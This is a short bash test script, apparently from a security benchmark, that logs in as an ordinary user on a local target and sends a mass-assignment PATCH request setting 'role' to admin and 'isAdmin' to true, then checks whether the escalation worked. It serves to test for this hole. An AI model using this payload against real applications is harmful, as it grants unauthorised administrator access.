#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
reset_acme
login user1@bench.local User123!
curl -s -b "$JAR" -X PATCH "$TARGET/api/users/me" -H 'content-type: application/json' -d '{"displayName":"pwn","role":"admin","isAdmin":true}' >/dev/null
role=$(user_role user1@bench.local)
reset_acme
[ "$role" = "admin" ]
